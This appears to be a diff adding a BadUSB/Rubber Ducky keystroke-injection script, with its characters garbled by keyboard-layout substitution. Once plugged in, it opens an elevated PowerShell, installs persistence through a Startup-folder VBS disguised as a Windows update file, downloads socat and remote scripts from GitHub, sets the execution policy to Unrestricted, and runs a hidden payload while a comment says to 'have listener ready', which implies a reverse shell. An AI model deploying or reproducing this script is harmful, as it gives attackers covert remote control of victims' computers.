@@ -1,0 +1,72 @@
+DELAY 1000
+REM //Open Powershelln in admin
+GUI r
+DELAY 200
+STRING powershell.exe
+CONTROL SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 100 
+ENTER
+DELAY 2000
+REM //kill powershell tasks
+STRING taskkill &IM powershell.exe &F
+ENTER
+REM //Open Powershelln in admin
+GUI r
+DELAY 200
+STRING powershell.exe
+CONTROL SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 100 
+ENTER
+DELAY 2000
+REM //Remove Persistence
+STRING Remove/Item -C>&Program Files&ZOLOFT&- /Recurse
+ENTER
+STRING Remove/Item -C>&ProgramData&Microsoft&Windows&Start Menu&Programs&StartUp&win/update/mngr.vbs- 
+ENTER
+REM //Create Files And directories
+STRING cd &
+ENTER
+STRING mkdir C>&@Program Files@&ZOLOFT
+ENTER
+STRING cd &@Program Files@&ZOLOFT
+ENTER
+DEALY 500
+REM //Download Files
+STRING wget -github.com&StudioEtrange&socat/windows&archive&refs&heads&master.zip-  /OutFile ZOLOFT.zip
+DELAY 200
+ENTER
+DELAY 3000
+REM //Extract Tools
+STRING Expand/Archive ZOLOFT.zip
+ENTER
+DELAY 100
+STRING cd ZOLOFT&socat/windows/master
+ENTER
+REM //Download Files
+STRING wget -https>&&raw.githubusercontent.com&KffeePt&BSOD&main&bsod.txt-  /OutFile bsod.ps1
+ENTER
+STRING wget -https>&&raw.githubusercontent.com&KffeePt&RICKROLL&main&roll.ps1-  /OutFile roll.ps1
+ENTER
+STRING wget -https>&&raw.githubusercontent.com&KffeePt&RICKROLL&main&start.ps1-  /OutFile start.ps1
+ENTER
+STRING wget -https>&&raw.githubusercontent.com&KffeePt&BSOD&main&security.ps1-  /OutFile securitykf.ps1
+ENTER
+STRING wget -https>&&raw.githubusercontent.com&KffeePt&BSOD&main&startupkf.vbs-  /OutFile win/update/mngr.vbs
+ENTER
+DELAY 1000
+REM //Set Startup
+STRING Move/Item /Path C>&@Program Files@&ZOLOFT&ZOLOFT&socat/windows/master&win/update/mngr.vbs /Destination C>&ProgramData&Microsoft&Windows&@Start Menu@&Programs&StartUp
+ENTER
+REM //Set ExecPol
+STRING Set/ExecutionPolicy Unrestricted
+ENTER
+DELAY 200
+STRING a
+ENTER
+REM //Run Exploit Have listener Ready
+STRING powershell.exe /windowstyle hidden .&securitykf.ps1
+ENTER
